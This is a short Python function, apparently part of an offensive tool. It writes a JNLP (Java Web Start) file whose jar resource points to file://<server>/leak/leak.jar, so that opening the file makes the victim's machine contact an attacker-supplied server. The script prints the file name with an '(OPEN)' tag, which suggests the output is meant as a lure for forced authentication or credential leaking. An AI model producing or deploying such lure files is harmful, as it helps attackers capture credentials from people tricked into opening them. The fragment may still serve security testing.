#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_jnlp(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://"""
        + server
        + """/leak/leak.jar"/>
   </resources>
   <application-desc/>
</jnlp>"""
    )
    file.close()
    print("Created: " + filename + " (OPEN)")
